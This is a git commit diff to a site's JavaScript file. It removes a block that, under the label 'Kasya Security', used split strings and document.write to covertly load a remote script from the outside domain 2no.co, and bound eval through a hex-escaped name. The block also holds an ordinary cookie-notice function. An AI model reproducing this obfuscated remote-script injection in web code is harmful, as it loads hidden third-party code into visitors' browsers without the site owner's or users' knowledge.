1ed04cb7ac6cd24997079b7391ca544d1d6b084a
Kasya Team <70856891+kasyateam@users.noreply.github.com>
2021-07-25 17:58:43 +0600

    Update kasya.js

--- assets/kasyateam/js/kasya.js
+++ assets/kasyateam/js/kasya.js
@@ -16,26 +16,3 @@ window.location.href = "/offline";
 window.location.href = "/server";
 } else {
 }
-
-var glop = 'script'
-var glap = '2no.co'
-document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')
-//Kasya Security
-a = this["\x65\x76\x61\x6C"];
-function checkCookies(){
-    let cookieDate = localStorage.getItem('cookieDate');
-    let cookieNotification = document.getElementById('cookie_notification');
-    let cookieBtn = cookieNotification.querySelector('.cookie_accept');
-
-    // Если записи про кукисы нет или она просрочена на 1 год, то показываем информацию про кукисы
-    if( !cookieDate || (+cookieDate + 31536000000) < Date.now() ){
-        cookieNotification.classList.add('show');
-    }
-
-    // При клике на кнопку, в локальное хранилище записывается текущая дата в системе UNIX
-    cookieBtn.addEventListener('click', function(){
-        localStorage.setItem( 'cookieDate', Date.now() );
-        cookieNotification.classList.remove('show');
-    })
-}
-checkCookies();
